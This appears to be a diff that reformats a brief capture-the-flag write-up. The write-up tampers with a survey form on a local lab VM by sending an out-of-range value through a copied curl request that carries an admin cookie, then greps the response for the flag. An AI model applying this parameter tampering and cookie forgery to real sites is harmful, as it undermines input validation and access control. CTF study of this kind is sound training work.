@@ -1,3 +1,12 @@
-On the survey page, we have a bunch of information that we can send to the server. When we try to modify them, a dropbox of 1 to 10 appears. We should be able to do some undefined behavior if we send a number outside of this range. Lets get the request with copy as curl in the network tab. And change value of the body.
+On the survey page, we have a bunch of information that we can send to the server. 
+When we try to modify them, a dropbox of 1 to 10 appears. 
+We should be able to do some undefined behavior if we send a number outside of this range. 
+Lets get the request with copy as curl in the network tab. And change value of the body.
 
-curl 'http://192.168.56.101/index.php?page=survey#' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.56.101/index.php?page=survey' -H 'Origin: http://192.168.56.101' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Priority: u=4' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'sujet=5&valeur=2022412214' | grep flag
+curl 'http://192.168.56.101/index.php?page=survey#' --compressed -X POST -H '
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 
+Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' 
+-H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.56.101/index.php?page=survey' 
+-H 'Origin: http://192.168.56.101' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' 
+-H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Priority: u=4' -H 'Pragma: no-cache' 
+-H 'Cache-Control: no-cache' --data-raw 'sujet=5&valeur=2022412214' | grep flag
